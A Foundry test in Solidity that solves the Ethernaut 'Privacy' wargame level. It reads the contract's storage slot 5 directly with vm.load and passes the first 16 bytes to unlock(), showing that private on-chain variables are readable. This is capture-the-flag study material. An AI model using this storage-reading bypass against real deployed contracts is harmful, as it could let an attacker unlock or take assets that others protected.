// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {Privacy, PrivacyFactory} from "ethernaut/levels/PrivacyFactory.sol";

contract PrivacyLevel is SetUpLevelTest {
    Privacy internal privacy;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        instanceBalance = 0 ether;
        playerBalance = 0 ether;
        level = address(new PrivacyFactory());
        super.setUp();
        privacy = Privacy(instance);

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        bytes32 key = vm.load(address(privacy), bytes32(uint256(5)));
        privacy.unlock(bytes16(key));
        vm.stopPrank();
    }
}
